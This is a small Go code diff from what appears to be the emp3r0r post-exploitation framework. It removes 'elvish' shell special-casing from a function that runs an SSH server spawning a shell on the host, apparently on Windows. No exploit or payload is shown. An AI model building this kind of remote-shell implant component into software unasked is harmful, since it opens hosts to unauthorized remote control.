@@ -15,7 +15,6 @@ import (
 	"time"
 
 	"github.com/gliderlabs/ssh"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/jm33-m0/go-console"
 	"golang.org/x/sys/windows"
 )
@@ -28,9 +27,6 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		e = fmt.Errorf("%s not found (%v)", shell, e)
 		log.Print(e)
 		return
-	}
-	if shell == "elvish" {
-		exe = util.ProcExePath(os.Getpid())
 	}
 
 	// ssh server
@@ -45,11 +41,6 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 
 	ssh_server.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
-
-		// Evlsh
-		if shell == "elvish" {
-			os.Setenv("ELVISH", "true")
-		}
 
 		// remove empty arg in cmd.Args
 		var tmp_args []string
